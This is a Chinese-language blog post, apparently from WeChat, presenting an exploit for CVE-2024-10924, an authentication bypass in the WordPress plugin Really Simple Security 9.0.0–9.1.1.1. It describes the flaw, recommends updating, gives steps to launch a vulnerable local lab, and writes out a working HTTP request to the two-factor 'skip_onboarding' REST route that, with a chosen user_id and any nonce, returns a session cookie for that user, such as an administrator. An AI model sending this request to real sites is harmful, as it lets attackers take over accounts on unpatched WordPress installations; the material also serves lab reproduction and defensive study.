#  【Exp】- CVE-2024-10924 WordPress插件Really Simple Security认证绕过漏洞   
原创 宬室司阍  埋藏酱油瓶   2024-11-19 03:49  
  
## 【🔔】互联网资料/工具，安全性未知，需要自行研判安全性。  
### 传送  
> https://github.com/m3ssap0/wordpress-really-simple-security-authn-bypass-vulnerable-application?tab=readme-ov-file  
  
## 漏洞描述  
> WordPress的Really Simple Security（免费版、专业版和多站点专业版）插件在版本9.0.0至9.1.1.1中存在身份验证绕过漏洞。这是由于在双因素REST API的“check_login_and_get_user”函数中，对用户检查错误处理不当所导致的。当启用“双重身份验证”设置（默认禁用）时，这使得未经身份验证的攻击者可以登录到网站上的任何现有用户，例如管理员。  
  
## 修复建议  
> 建议您更新当前系统或软件至最新版，完成漏洞的修复。  
  
## 影响范围  
> 9.0.0 - 9.1.1.1 Really Simple Security < 9.1.2  
  
## 复现  
### 用法  
- •  
 设置环境的步骤如下：  
  
```
1. Launch./up.sh to start composition.
2.Complete the installation of WordPress here: https://localhost:1337/wp-admin/install.php.
3.Login into WordPress.
4.Go to "Plugins": https://localhost:1337/wp-admin/plugins.php.
5.Click on "Activate" under the "Really Simple Security" plugin. DO NOT UPDATE IT, since we need the vulnerable version.
6.Click on "Cancel" on the popup referring to SSL activation.
7.Go to "Settings">"Login Protection">"Two-Factor Authentication" and,in the "Two-Factor Authentication" section,
8.enable"Enable Two-Factor Authentication".
9.Click the "Save" button.
```  
- •   
该容器将被称为 vuln-wp-really-simple-security.  
  
- • 要拆卸环境，请使用./down.sh命令或./down_and_delete.sh命令来删除图像和数据库卷.  
  
## Exploit  
- •   
要利用该漏洞，类似以下的请求可验证：  
  
```
POST /?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding HTTP/1.1
Host: localhost:1337
Content-Type: application/json
Content-Length:88
Connection: keep-alive

{
"user_id":1,
"login_nonce":"133333337",
"redirect_to":"/wp-admin/"
}
```  
- • 然后在浏览器中相应地设置返回的会话cookie.  
  
- • user_id必须是目标用户的 ID， login_nonce可以是任何值，因为错误的值不会阻止进程.  
  
## ✨参考链接  
1. 1. https://plugins.trac.wordpress.org/changeset/3188431/really-simple-ssl  
  
1. 2. https://www.cve.org/CVERecord?id=CVE-2024-10924  
  
1. 3. https://www.wordfence.com/threat-intel/vulnerabilities/detail/really-simple-security-free-pro-and-pro-multisite-900-9111-authentication-bypass  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aOiar7mEUNloiaTXNgRacTmqVqfic04SpL9tfvFBd7VhZEzLnict8Xju4IeDQLRIS0Ot0GiaxEtYuqdVlpZwibjBFDpQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/aOiar7mEUNlqIeYPL63ftuHYOg5LA6Izamo9VLniaX7pBCa2ATgAoIhOm8DuWwGa17csZQkM3fvZ9vjLCZnI37xA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
